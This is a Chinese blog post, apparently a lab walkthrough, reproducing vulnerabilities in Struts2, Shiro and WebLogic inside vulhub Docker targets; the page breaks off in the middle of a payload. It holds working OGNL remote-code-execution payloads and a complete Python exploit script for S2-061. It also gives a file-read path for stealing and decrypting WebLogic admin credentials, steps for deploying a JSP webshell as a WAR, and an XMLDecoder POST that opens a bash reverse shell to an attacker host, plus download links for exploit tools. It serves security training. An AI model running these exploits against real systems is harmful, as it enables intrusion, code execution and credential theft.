<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>vulhub靶场框架漏洞复现手册（strusts2\shiro\weblogic）附工具链接 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="vulhub靶场框架漏洞复现手册（strusts2\shiro\weblogic）附工具链接" />
<meta property="og:description" content="文章目录
前言
一、struts2远程代码执行
s2-029
s2-061
s2-001
二、shiro反序列化漏洞复现
总结
前言 工具&#43;手工复现vulhub靶场下的框架漏洞，包括struts2远程代码执行(2-029,s2-061，s2-001),shiro反序列化漏洞（CVE-2016-4437）,weblogic反序列化漏洞（CVE-2017-10271,CVE-2018-2628,CVE-2018-2894,CVE-2020-14882,ssrf,weak-password）。持续更新中...
一、struts2远程代码执行 漏洞介绍：Struts2是apache项目下的一个web 框架，普遍应用于阿里巴巴、京东等互联网、政府、企业门户网站
漏洞特征：
1. 查看被测应用系统的源码，URL接口地址以 “.action” “.do” 结尾或地址中包含“!”符号，或者在被测应用的服务器上查看应用所在目录/WEB-INF/lib/下的jar文件，若存在struts2-core-
2.*.**.jar或xwork-core-2.*.**.jar格式的jar文件，则需检测是否存在Struts2远程代码执行漏洞。
s2-029 1. 拉取漏洞环境镜像
docker pull medicean/vulapps:s_struts2_s2-029 2. 启动漏洞环境
docker run -d -p 8080:8080 medicean/vulapps:s_struts2_s2-029 3. 测试靶场
访问kali ip:8080，出现如下代表靶场搭建成功
4. 使用工具利用漏洞
（1）Liqun验证
验证结果：存在漏洞
命令执行
工具链接：https://pan.baidu.com/s/1aLIAJkEUlv-6lsuCO9lEZw 提取码：8lk3
（2） Strusts2_Test工具
命令执行
工具链接：https://pan.baidu.com/s/1tsP2yPeX-QtKHAmuD1ITSA 提取码：8lk3
（3） Strusts2漏洞检查工具
命令执行
工具链接：https://pan.baidu.com/s/1ffOoxKGnuTXp7-Mvbu__2Q 提取码：8lk3
5. 手工利用漏洞
（1） 刷新页面抓包，发送到repeater。如果url的位置只有ip:8080，就手动在后面添加/default.action?message=。之后在message=后拼接poc
#POC (%23_memberAccess[&#39;allowPrivateAccess&#39;]=true,%23_memberAccess[&#39;allowProtectedAccess&#39;]=true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]=%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]=%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]=true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())) 返回包爆出了用户权限
s2-061 1. 进入vulhub目录用docker拉取镜像启动环境。如果没有启动成功是因为上一个开启的靶场占用了8080端口。重启一下docker就行。
重启docker命令：systemctl restart docker 开启环境命令：docker-compose up -d 2." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/aad7ecacbbecb74413906cd58c9f8b35/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-12-15T20:13:15+08:00" />
<meta property="article:modified_time" content="2022-12-15T20:13:15+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">vulhub靶场框架漏洞复现手册（strusts2\shiro\weblogic）附工具链接</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <blockquote> 
 <p></p> 
</blockquote> 
<p></p> 
<div> 
 <p id="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95-toc" style="margin-left:80px;"><a href="#%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95" rel="nofollow">文章目录</a></p> 
 <p id="%E5%89%8D%E8%A8%80-toc" style="margin-left:0px;"><a href="#%E5%89%8D%E8%A8%80" rel="nofollow">前言</a></p> 
 <p id="%E4%B8%80%E3%80%81struts2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-toc" style="margin-left:0px;"><a href="#%E4%B8%80%E3%80%81struts2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C" rel="nofollow">一、struts2远程代码执行</a></p> 
 <p id="s2-029-toc" style="margin-left:40px;"><a href="#s2-029" rel="nofollow">s2-029</a></p> 
 <p id="s2-061-toc" style="margin-left:40px;"><a href="#s2-061" rel="nofollow">s2-061</a></p> 
 <p id="s2-001-toc" style="margin-left:40px;"><a href="#s2-001" rel="nofollow">s2-001</a></p> 
 <p id="-toc" style="margin-left:0px;"></p> 
 <p id="%E4%BA%8C%E3%80%81shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-toc" style="margin-left:0px;"><a href="#%E4%BA%8C%E3%80%81shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0" rel="nofollow">二、shiro反序列化漏洞复现</a></p> 
 <p id="1.%E5%BC%95%E5%85%A5%E5%BA%93-toc" style="margin-left:40px;"></p> 
 <p id="%E6%80%BB%E7%BB%93-toc" style="margin-left:0px;"><a href="#%E6%80%BB%E7%BB%93" rel="nofollow">总结</a></p> 
 <hr id="hr-toc"> 
 <p></p> 
 <p></p> 
</div> 
<h2 id="%E5%89%8D%E8%A8%80"><a id="_7"></a>前言</h2> 
<p>工具+手工复现vulhub靶场下的框架漏洞，包括struts2远程代码执行(2-029,s2-061，s2-001),shiro反序列化漏洞（CVE-2016-4437）,weblogic反序列化漏洞（CVE-2017-10271,CVE-2018-2628,CVE-2018-2894,CVE-2020-14882,ssrf,weak-password）。持续更新中...</p> 
<hr> 
<p></p> 
<h2 id="%E4%B8%80%E3%80%81struts2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><a id="pandas_16"></a>一、struts2远程代码执行</h2> 
<p>漏洞介绍：Struts2是apache项目下的一个web 框架，普遍应用于阿里巴巴、京东等互联网、政府、企业门户网站</p> 
<p>漏洞特征：</p> 
<p style="margin-left:.0001pt;text-align:left;">1. 查看被测应用系统的源码，URL接口地址以 “.action” “.do” 结尾或地址中包含“!”符号，或者在被测应用的服务器上查看应用所在目录/WEB-INF/lib/下的jar文件，若存在struts2-core-</p> 
<p style="margin-left:.0001pt;text-align:left;">2.*.**.jar或xwork-core-2.*.**.jar格式的jar文件，则需检测是否存在Struts2远程代码执行漏洞。</p> 
<h3 id="s2-029">s2-029</h3> 
<p>1. 拉取漏洞环境镜像</p> 
<pre><code>docker pull medicean/vulapps:s_struts2_s2-029</code></pre> 
<h2 id="%E2%80%8B%E7%BC%96%E8%BE%91%C2%A0"><a id="_19"></a><img alt="" height="297" src="https://images2.imgbox.com/c6/00/0EHH4lWF_o.png" width="537"> </h2> 
<p>2. 启动漏洞环境</p> 
<pre><code>docker run -d -p 8080:8080 medicean/vulapps:s_struts2_s2-029</code></pre> 
<p><img alt="" height="103" src="https://images2.imgbox.com/66/6b/IvNxZdEV_o.png" width="479"></p> 
<p>3. 测试靶场</p> 
<p style="margin-left:.0001pt;text-align:justify;">访问kali ip:8080，出现如下代表靶场搭建成功</p> 
<p><img alt="" height="289" src="https://images2.imgbox.com/e7/c6/DbLdEqLW_o.png" width="428"></p> 
<p>4. 使用工具利用漏洞</p> 
<p>        （1）Liqun验证</p> 
<p><img alt="" height="356" src="https://images2.imgbox.com/9c/c4/sXoJ4ZEf_o.png" width="483"></p> 
<p> 验证结果：存在漏洞</p> 
<p> 命令执行</p> 
<p><img alt="" height="134" src="https://images2.imgbox.com/a9/85/0ODBEkGU_o.png" width="554"></p> 
<p>工具链接：https://pan.baidu.com/s/1aLIAJkEUlv-6lsuCO9lEZw <br> 提取码：8lk3</p> 
<p>        （2） Strusts2_Test工具</p> 
<p><img alt="" height="393" src="https://images2.imgbox.com/67/d9/zk5dh0Hf_o.png" width="554"></p> 
<p>命令执行</p> 
<p><img alt="" height="393" src="https://images2.imgbox.com/0b/c1/21ijbIxf_o.png" width="554"></p> 
<p>工具链接：https://pan.baidu.com/s/1tsP2yPeX-QtKHAmuD1ITSA <br> 提取码：8lk3</p> 
<p>        （3） Strusts2漏洞检查工具</p> 
<p> <img alt="" height="419" src="https://images2.imgbox.com/c5/45/bm4UEKnG_o.png" width="467"></p> 
<p>命令执行</p> 
<p><img alt="" height="422" src="https://images2.imgbox.com/71/2a/ICzhdazi_o.png" width="470"></p> 
<p>工具链接：https://pan.baidu.com/s/1ffOoxKGnuTXp7-Mvbu__2Q <br> 提取码：8lk3</p> 
<p> 5. 手工利用漏洞</p> 
<p>        （1） 刷新页面抓包，发送到repeater。如果url的位置只有ip:8080，就手动在后面添加/default.action?message=。之后在message=后拼接poc</p> 
<p></p> 
<pre><code>#POC
(%23_memberAccess['allowPrivateAccess']=true,%23_memberAccess['allowProtectedAccess']=true,%23_memberAccess['excludedPackageNamePatterns']=%23_memberAccess['acceptProperties'],%23_memberAccess['excludedClasses']=%23_memberAccess['acceptProperties'],%23_memberAccess['allowPackageProtectedAccess']=true,%23_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()))</code></pre> 
<p> <img alt="" height="363" src="https://images2.imgbox.com/f7/98/PPEQ0nDQ_o.png" width="553"></p> 
<p>返回包爆出了用户权限</p> 
<p></p> 
<p></p> 
<p></p> 
<h3 id="s2-061">s2-061</h3> 
<p> 1. 进入vulhub目录用docker拉取镜像启动环境。如果没有启动成功是因为上一个开启的靶场占用了8080端口。重启一下docker就行。</p> 
<pre><code>重启docker命令：systemctl restart docker
开启环境命令：docker-compose up -d</code></pre> 
<p><img alt="" height="101" src="https://images2.imgbox.com/0e/85/pLHqqdwD_o.png" width="258"></p> 
<p>2. 访问靶场</p> 
<p style="margin-left:.0001pt;text-align:justify;">http://kali ip:8080</p> 
<p><img alt="" height="186" src="https://images2.imgbox.com/bf/ea/HyDi71O9_o.png" width="409"></p> 
<p></p> 
<p>3.验证漏洞</p> 
<p style="margin-left:.0001pt;text-align:justify;">发现使用工具验证不到漏洞存在，所以按照教程手工验证</p> 
<p style="text-align:justify;">        (1) 在url后面拼接一条简单语句进行测试</p> 
<p style="margin-left:.0001pt;text-align:justify;">        ?id=%<a href="http://192.168.189.129:8080/.action" rel="nofollow" title="{ 'test' + (2000 + 20).toString()} ">{ 'test' + (2000 + 20).toString()} </a></p> 
<p><img alt="" height="149" src="https://images2.imgbox.com/60/75/iENAyZHq_o.png" width="425"></p> 
<p style="margin-left:.0001pt;text-align:justify;">查看页面源码发现被执行了，漏洞是存在的</p> 
<p><img alt="" height="139" src="https://images2.imgbox.com/92/75/NGrSxN1F_o.png" width="485"></p> 
<p>4. 漏洞利用</p> 
<p>        (1) 方法一：使用python脚本利用漏洞</p> 
<p>                ① Struts2-061.py</p> 
<pre><code>#struts2-061.py
#encoding=utf-8
import requests
import sys
from lxml import etree


def exp(url, cmd):
    payload = "%25%7b(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application%5b%27org.apache.tomcat.InstanceManager%27%5d).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr%5b%27struts.valueStack%27%5d).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d%7b%27" + cmd + "%27%7d).(%23res%3d%23exec.exec(%23cmd))%7d"
    tturl = url + "/?id=" + payload
    r = requests.get(tturl)
    page = r.text
    #   etree=html.etree
    page = etree.HTML(page)
    data = page.xpath('//a[@id]/@id')
    print(data[0])


if __name__ == '__main__':
    print('+------------------------------------------------------------+')
    print('+ EXP: python struts2-061-poc.py http://1.1.1.1:8081 id      +')
    print('+ VER: Struts 2.0.0-2.5.25                                   +')
    print('+------------------------------------------------------------+')
    print('+ S2-061 RCE &amp;&amp; CVE-2020-17530                               +')
    print('+------------------------------------------------------------+')
    if len(sys.argv) != 3:
        print("[+]ussage: http://ip:port command")
        print("[+]============================================================")
        sys.exit()
    url = sys.argv[1]
    cmd = sys.argv[2]
exp(url, cmd)</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;">                ② 在脚本目录打开cmd，运行脚本</p> 
<pre><code>python struts2-061.py url cmd</code></pre> 
<h2 id="%E2%80%8B%E7%BC%96%E8%BE%91"><img alt="" height="145" src="https://images2.imgbox.com/6f/c8/SrzcvOPY_o.png" width="554"></h2> 
<p></p> 
<p>脚本链接：https://pan.baidu.com/s/1InbHliCX07UKcayWlIKwbA <br> 提取码：8lk3</p> 
<p></p> 
<p>        （2） 方法二：在url上构造payload</p> 
<p>                ① payload</p> 
<pre><code>?id=%25{(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application[%27org.apache.tomcat.InstanceManager%27]).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr[%27struts.valueStack%27]).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d{%27id%27}).(%23res%3d%23exec.exec(%23cmd))}</code></pre> 
<h2><img alt="" height="122" src="https://images2.imgbox.com/9e/e4/HTcjW4GE_o.png" width="553"></h2> 
<p>                 ② 查看页面源代码发现命令被执行了</p> 
<p></p> 
<h2><img alt="" height="198" src="https://images2.imgbox.com/c1/f3/JPvl1c2x_o.png" width="409"></h2> 
<p></p> 
<h3></h3> 
<p></p> 
<h3 id="s2-001">s2-001</h3> 
<ol><li style="text-align:justify;">启动环境 docker-compose up -d</li><li style="text-align:justify;">访问靶场，验证是否存在代码执行。输入代码%{123},返回的是参数值123，说明漏洞存在。</li></ol> 
<h2><img alt="" height="169" src="https://images2.imgbox.com/1e/76/3tk3r29E_o.png" width="359"></h2> 
<p><img alt="" height="196" src="https://images2.imgbox.com/1d/c2/2LNNFxpM_o.png" width="385"></p> 
<p></p> 
<p style="text-align:justify;">        3. 构造poc，填到password框</p> 
<p style="margin-left:.0001pt;text-align:justify;">（1）Tomcat执行语句</p> 
<pre><code>Poc:%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="144" src="https://images2.imgbox.com/4a/80/Kr4QcrXB_o.png" width="352"></p> 
<p> （2） 获取web路径</p> 
<pre><code>Poc:

%{

#req=@org.apache.struts2.ServletActionContext@getRequest(),

#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),

#response.println(#req.getRealPath("/")),

#response.flush(),

#response.close()

}</code></pre> 
<p><img alt="" height="217" src="https://images2.imgbox.com/27/cd/84e2shAc_o.png" width="426"></p> 
<p></p> 
<p>（3） 查看权限 </p> 
<pre><code>Poc:
%{
#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),
#b=#a.getInputStream(),
#c=new java.io.InputStreamReader(#b),
#d=new java.io.BufferedReader(#c),
#e=new char[50000],
#d.read(#e),
#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
#f.getWriter().println(new java.lang.String(#e)),
#f.getWriter().flush(),#f.getWriter().close()
}</code></pre> 
<p><img alt="" height="153" src="https://images2.imgbox.com/0f/fc/fdEajF9r_o.png" width="341"></p> 
<p></p> 
<p style="margin-left:.0001pt;text-align:justify;">（4） 在执行任意命令时只需要将上面poc的whoami替换</p> 
<p></p> 
<h3></h3> 
<h2 id="%E4%BA%8C%E3%80%81shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">二、shiro反序列化漏洞</h2> 
<h3 id="CVE-2016-4437">CVE-2016-4437</h3> 
<p>1. 开启靶场</p> 
<p><img alt="" height="192" src="https://images2.imgbox.com/41/ce/Cj46EVD2_o.png" width="366"></p> 
<p style="margin-left:.0001pt;text-align:justify;">进入到靶场目录下使用命令：docker-compose up -d --build</p> 
<p style="margin-left:.0001pt;text-align:justify;">如果添加了--build参数出错(如下)的话就把它删掉。猜测只有第一次开启这个靶场的时候才需要--build，已经开过就不用--build参数</p> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="386" src="https://images2.imgbox.com/53/77/ldlQxDEK_o.png" width="429"></p> 
<p style="margin-left:.0001pt;text-align:justify;">出现done则说明靶场开启成功</p> 
<p> <img alt="" height="107" src="https://images2.imgbox.com/2c/f7/O8sQQKGU_o.png" width="403"></p> 
<p>2. 测试靶场</p> 
<p> 在win10火狐输入kalli ip+8080测试靶场是否开启成功</p> 
<p><img alt="" height="508" src="https://images2.imgbox.com/79/c3/NLmforS0_o.png" width="554"></p> 
<p>3. 查看返回包验证是否存在shiro漏洞</p> 
<p style="margin-left:.0001pt;text-align:justify;">使用admin/vulhub登录，勾选remember me,抓包。发送到repeater,查看回显包有无remember=deleteme字段。如果有则存在shiro漏洞</p> 
<p> <img alt="" height="411" src="https://images2.imgbox.com/b1/3c/nQMZxJPJ_o.png" width="523"></p> 
<p>4. 用工具检验漏洞</p> 
<p style="margin-left:.0001pt;text-align:justify;">工具：liqun</p> 
<p> <img alt="" height="341" src="https://images2.imgbox.com/ee/14/ePaFKfSD_o.png" width="494"></p> 
<p>5. 反弹shell</p> 
<p>        (1) 在kali新开一个终端监听端口。命令：nc -lvvp 端口号</p> 
<p> <img alt="" height="56" src="https://images2.imgbox.com/9f/82/Khzyi3GM_o.png" width="265"></p> 
<p>        (2) 使用工具反弹shell</p> 
<p> <img alt="" height="270" src="https://images2.imgbox.com/2b/a8/QxixXtIK_o.png" width="553"></p> 
<p>        (3) 在终端执行命令</p> 
<p><img alt="" height="175" src="https://images2.imgbox.com/09/e9/hJtvuwrv_o.png" width="545"></p> 
<p>        （4） 在工具执行命令 </p> 
<p> <img alt="" height="279" src="https://images2.imgbox.com/7d/1e/Wc9zgAmg_o.png" width="365"></p> 
<p style="margin-left:.0001pt;text-align:justify;">总结：想尝试使用centOS7来监听端口接收反弹的shell，但是工具里面显示执行成功centOS7的终端一直接收不到反弹的shell。所以还是用kali方便~</p> 
<p> <img alt="" height="273" src="https://images2.imgbox.com/d6/29/wbccUl4G_o.png" width="554"></p> 
<p></p> 
<p></p> 
<h3></h3> 
<h2 id="%E4%B8%89%E3%80%81weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">三、weblogic反序列化漏洞</h2> 
<p>tips:weblogic常用端口是7001</p> 
<p></p> 
<h3 id="weak_password">weak_password</h3> 
<p>1. 进入viulhub目录开启漏洞环境</p> 
<pre><code>#cd vulhub/welogic/weak_password
#docker-compode up -d</code></pre> 
<p><img alt="" height="350" src="https://images2.imgbox.com/5b/34/FSBmLGfU_o.png" width="405"></p> 
<p>2. 查看端口映射信息，发现映射到了7001</p> 
<pre><code>docker ps</code></pre> 
<p><img alt="" height="212" src="https://images2.imgbox.com/dc/4e/ORWuHZhw_o.png" width="404"></p> 
<p>3. 访问靶场</p> 
<p style="margin-left:.0001pt;text-align:justify;"><a href="http://kali" rel="nofollow" title="http://kali">http://kali</a> ip:7001</p> 
<p><img alt="" height="283" src="https://images2.imgbox.com/4b/e8/7ykVirHc_o.png" width="325"></p> 
<p></p> 
<p>4. 使用工具检测漏洞</p> 
<p>        （1） liqun</p> 
<p><img alt="" height="331" src="https://images2.imgbox.com/c1/89/PJi7iFsq_o.png" width="422"></p> 
<p><img alt="" height="331" src="https://images2.imgbox.com/6d/3c/t3MjeMO4_o.png" width="422"></p> 
<p><img alt="" height="160" src="https://images2.imgbox.com/0b/9c/2u3aAP3S_o.png" width="415"></p> 
<p>        (2) java反序列化漏洞利用工具</p> 
<p> <img alt="" height="312" src="https://images2.imgbox.com/86/5f/fDiFQQXx_o.png" width="392"></p> 
<p><img alt="" height="331" src="https://images2.imgbox.com/f5/b6/cdbw6q7m_o.png" width="402"></p> 
<p></p> 
<p>工具链接：https://pan.baidu.com/s/1Q38EAa47qRHCEXMlYAtUtg <br> 提取码：8lk3</p> 
<p>5. 手工利用漏洞</p> 
<p>        （1） 访问/console/login/LoginForm.jsp</p> 
<p>转到后台登录页面</p> 
<p><img alt="" height="335" src="https://images2.imgbox.com/13/4e/PmGOCHfo_o.png" width="380"></p> 
<p>        （2） 获取用户和密码的加密密钥和密文</p> 
<p>        （3） 获取密钥</p> 
<p style="margin-left:.0001pt;text-align:justify;">weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。这两个文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml。储存密钥的文件：SerializedSystemIni.dat</p> 
<p style="margin-left:.0001pt;text-align:justify;">访问：<a href="http://ip:7001/hello/file.jsp?path=security/SerializedSystemIni.dat" rel="nofollow" title="http://ip:7001//hello/file.jsp?path=security/SerializedSystemIni.dat">http://ip:7001//hello/file.jsp?path=security/SerializedSystemIni.dat</a> 抓包重发，返回包中的一串乱码就是密钥。</p> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="309" src="https://images2.imgbox.com/a7/de/J3ZkeaiH_o.png" width="392"></p> 
<p>         （4） 将密钥保存为一个.bat文件便于后续解密 </p> 
<p> <img alt="" height="360" src="https://images2.imgbox.com/52/f0/PqY6yIRU_o.png" width="266"></p> 
<p>        （5） 获取密文</p> 
<p style="margin-left:.0001pt;text-align:left;">访问http://ip:7001/hello/file.jsp?path=config/config.xml，其中的&lt;node-manager-password-encrypted&gt; 的值，即为加密后的管理员密码</p> 
<p> <img alt="" height="295" src="https://images2.imgbox.com/ff/8a/2icLC2Ao_o.png" width="366"></p> 
<p>        （6） 只用工具解密</p> 
<p>工具链接：https://pan.baidu.com/s/1Wf6FXgfMjmWo_bTqQ1D5eQ <br> 提取码：8lk3</p> 
<p> 添加密钥文件时最好使用工具包里的weblogic\Weblogic\SerializedSystemIni.dat文件。用自己保存的那个会出现错误不知道为啥。</p> 
<p> <img alt="" height="329" src="https://images2.imgbox.com/b5/d5/5dtmEqNj_o.png" width="394"></p> 
<p></p> 
<p>         （7）weblogic常用的用户名/密码</p> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="244" src="https://images2.imgbox.com/33/7f/5xRWvPbX_o.png" width="213"></p> 
<p>6. 后台文件上传</p> 
<p>        （1） 用刚刚解密出来的用户名和密码登录系统</p> 
<p>        （2） 上传路径：域结构-部署-安装-上 传文件</p> 
<p><img alt="" height="243" src="https://images2.imgbox.com/11/9d/3TbI4JHj_o.png" width="384"></p> 
<p>        （3） 将jsp木马文件压缩。（冰蝎文件夹下面有各个语言的一句话木马）</p> 
<p style="margin-left:.0001pt;text-align:justify;">压缩为war文件的命令：jar -cvf shell.war shell.jsp</p> 
<p style="margin-left:.0001pt;text-align:justify;">因为<span style="color:#000000;">war</span><span style="color:#000000;">是一个可以直接运行的</span><span style="color:#000000;">web</span><span style="color:#000000;">模块，通常用于网站，打成包部署到容器中。</span><span style="color:#000000;">war</span><span style="color:#000000;">包放置到</span><span style="color:#000000;">web</span><span style="color:#000000;">目录下之后，可以自动解压，就相当于发布了简单来说，</span><span style="color:#000000;">war</span><span style="color:#000000;">包是</span><span style="color:#000000;">JavaWeb</span><span style="color:#000000;">程序打的包，</span><span style="color:#000000;">war</span><span style="color:#000000;">包里面包括写的代码编译成的</span><span style="color:#000000;">class</span><span style="color:#000000;">文件，依赖的包，配置文件，所有的网站页面，包括</span><span style="color:#000000;">html</span><span style="color:#000000;">，</span><span style="color:#000000;">jsp</span><span style="color:#000000;">等等。 </span></p> 
<p> <img alt="" height="485" src="https://images2.imgbox.com/55/b1/I1umkjz6_o.png" width="440"></p> 
<p> <img alt="" height="117" src="https://images2.imgbox.com/ce/f0/dYcpLDwW_o.png" width="411"></p> 
<p>（4）部署完成</p> 
<p> <img alt="" height="208" src="https://images2.imgbox.com/32/ed/oGFOngK1_o.png" width="442"></p> 
<p><img alt="" height="381" src="https://images2.imgbox.com/be/30/yWVH2vnz_o.png" width="458"></p> 
<p><img alt="" height="221" src="https://images2.imgbox.com/cf/92/QKy9a6Wo_o.png" width="464"></p> 
<p></p> 
<p></p> 
<p></p> 
<h3 id="CVE-%202017-10271">CVE- 2017-10271</h3> 
<p>1. 启动靶场环境</p> 
<pre><code>docker-compose up -d </code></pre> 
<p> <img alt="" height="300" src="https://images2.imgbox.com/05/32/myzQrdsx_o.png" width="460"></p> 
<p>2. 查看docker端口开启情况，发现开启了7001端口</p> 
<p><img alt="" height="146" src="https://images2.imgbox.com/79/eb/BWnqCNHA_o.png" width="473"></p> 
<p>3. 访问靶场路径，kali IP:7001//wls-wsat/CoordinatorPortType11，出现下图说明存在漏洞</p> 
<p> <img alt="" height="204" src="https://images2.imgbox.com/d0/90/oZcJwmuB_o.png" width="471"></p> 
<p>4. 用攻击机端口21开启监听</p> 
<p>刚开始使用win10作为监听机，但是无法监听到内容。换成kali就行。因为靶场和kali相当于处于同一个内网，物理机是作为外网的存在，所以win10无法直接监听到内网的端口。</p> 
<p><img alt="" height="63" src="https://images2.imgbox.com/d4/f9/ikFx9kxb_o.png" width="236"></p> 
<p>5. 使用bp向靶机发送如下post请求</p> 
<pre><code>POC:
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 靶机ip:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 637

&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt; &lt;soapenv:Header&gt;
&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;
&lt;java version="1.4.0" class="java.beans.XMLDecoder"&gt;
&lt;void class="java.lang.ProcessBuilder"&gt;
&lt;array class="java.lang.String" length="3"&gt;
&lt;void index="0"&gt;
&lt;string&gt;/bin/bash&lt;/string&gt;
&lt;/void&gt;
&lt;void index="1"&gt;
&lt;string&gt;-c&lt;/string&gt;
&lt;/void&gt;
&lt;void index="2"&gt;
&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/攻击机ip/监听端口 0&amp;gt;&amp;amp;1&lt;/string&gt;
&lt;/void&gt;
&lt;/array&gt;
&lt;void method="start"/&gt;&lt;/void&gt;
&lt;/java&gt;
&lt;/work:WorkContext&gt;
&lt;/soapenv:Header&gt;
&lt;soapenv:Body/&gt;
&lt;/soapenv:Envelope&gt;</code></pre> 
<p> <img alt="" height="449" src="https://images2.imgbox.com/c9/cb/SLyXJYyq_o.png" width="463"></p> 
<p>6. 发送POC结果</p> 
<p><img alt="" height="435" src="https://images2.imgbox.com/93/1a/3lg73yuW_o.png" width="444"></p> 
<p>成功接收到反弹shell</p> 
<p><img alt="" height="139" src="https://images2.imgbox.com/da/dc/j29sAbTU_o.png" width="554"></p> 
<p>简单命令执行：</p> 
<p><img alt="" height="126" src="https://images2.imgbox.com/b5/65/AiwQOA0E_o.png" width="554"></p> 
<p>7. 尝试 写一句话木马，将poc拼接到之前的post请求下</p> 
<pre><code>POC:
&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
     &lt;soapenv:Header&gt;
     &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;
     &lt;java&gt;&lt;java version="1.4.0" class="java.beans.XMLDecoder"&gt;
     &lt;object class="java.io.PrintWriter"&gt;      &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt;
     &lt;void method="println"&gt;&lt;string&gt;
     &lt;![CDATA[
 &lt;% out.print("test"); %&gt;
     ]]&gt;
     &lt;/string&gt;
     &lt;/void&gt;
     &lt;void method="close"/&gt;
